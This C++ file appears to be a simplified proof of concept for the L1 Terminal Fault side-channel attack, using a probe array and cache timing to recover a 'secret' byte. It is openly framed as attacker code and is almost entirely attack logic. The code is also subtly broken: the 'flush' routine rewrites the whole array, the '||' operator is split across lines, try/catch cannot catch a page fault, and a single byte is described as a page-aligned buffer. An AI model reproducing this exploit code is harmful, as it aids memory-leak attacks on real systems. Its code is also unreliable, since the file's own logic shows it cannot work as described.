#include <iostream>
#include <vector>
#include <chrono>
#include <map>
#include <sys/mman.h> // For mmap, munmap (Linux/Unix)
#include <unistd.h>   // For sysconf (_SC_PAGESIZE)

// --- Simulated Privileged/Victim Data in L1D ---
// In a real scenario, this data would be loaded into L1D by a privileged process
// (e.g., kernel, hypervisor, or SGX enclave) and then its PTE would be invalidated.
unsigned char l1d_secret_data; // A page-aligned buffer to hold secret

// --- Attacker's Code ---
unsigned char probe_array_l1tf[256 * 4096]; // Cache side channel

// Function to measure access time
long long measure_access_time(volatile unsigned char* addr) {
    auto start = std::chrono::high_resolution_clock::now();
    volatile unsigned char temp = *addr;
    auto end = std::chrono::high_resolution_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
}

// Function to flush a cache line
void flush_cache_line(volatile unsigned char* addr) {
    for (int i = 0; i < 256 * 4096; ++i) {
        probe_array_l1tf[i] = 0;
    }
}

// This function attempts to access a virtual address with an invalid PTE
// but whose data is in L1D.
void trigger_l1tf_read(volatile unsigned char* invalid_virt_addr) {
    // This part would typically be in assembly to control precise timing and fault handling.
    // The key is that the CPU speculatively loads from 'invalid_virt_addr'
    // if its physical page is in L1D, even though the PTE is invalid.

    try {
        // Attempt to read from the invalid virtual address
        unsigned char transient_value = *invalid_virt_addr;

        // Use the transient_value to access the probe_array
        volatile unsigned char temp = probe_array_l1tf[transient_value * 4096];

    } catch (const std::exception& e) {
        // Expected fault. The cache side effect persists.
    }
}

int main() {
    // Initialize probe_array
    for (int i = 0; i < 256 * 4096; ++i) {
        probe_array_l1tf[i] = 1;
    }

    // Simulate a secret in a page that will be in L1D
    l1d_secret_data = 0xCC; // The secret byte

    // --- Setup for L1TF (highly simplified simulation) ---
    // In a real attack, this involves:
    // 1. A privileged entity (kernel/hypervisor) loads secret data into L1D.
    // 2. The privileged entity then invalidates the PTE for that page (e.g., by swapping it out).
    // 3. The attacker then tries to access this now-invalid virtual address.

    // For this high-level example, we'll just assume l1d_secret_data is in L1D
    // and we have a pointer to it that *should* be invalid but isn't.
    // This is a major simplification as directly invalidating PTEs from userland is not possible.
    volatile unsigned char* simulated_invalid_virt_addr = &l1d_secret_data;

    std::cout << "Starting L1 Terminal Fault (L1TF) attack simulation..." << std::endl;

    // Phase 1: Ensure secret is in L1D (simulated) and prepare for leakage
    // In a real scenario, a victim would load this data.
    // We'll just touch it to ensure it's "hot" in cache.
    volatile unsigned char dummy_read = l1d_secret_data;

    // Flush the probe array
    for (int i = 0; i < 256; ++i) {
        flush_cache_line(&probe_array_l1tf[i * 4096]);
    }

    // Phase 2: Trigger the transient read
    std::cout << "Triggering transient read from L1D with invalid PTE (simulated)..." << std::endl;
    trigger_l1tf_read(simulated_invalid_virt_addr);

    // Phase 3: Recover the secret via side channel
    std::cout << "Measuring cache access times to recover secret..." << std::endl;
    long long min_time = -1;
    int leaked_byte = -1;

    for (int i = 0; i < 256; ++i) {
        long long time = measure_access_time(&probe_array_l1tf[i * 4096]);
        if (min_time == -1 |
| time < min_time) {
            min_time = time;
            leaked_byte = i;
        }
    }

    std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
    std::cout << "Expected secret byte: 0x" << std::hex << (int)l1d_secret_data << std::endl;

    return 0;
}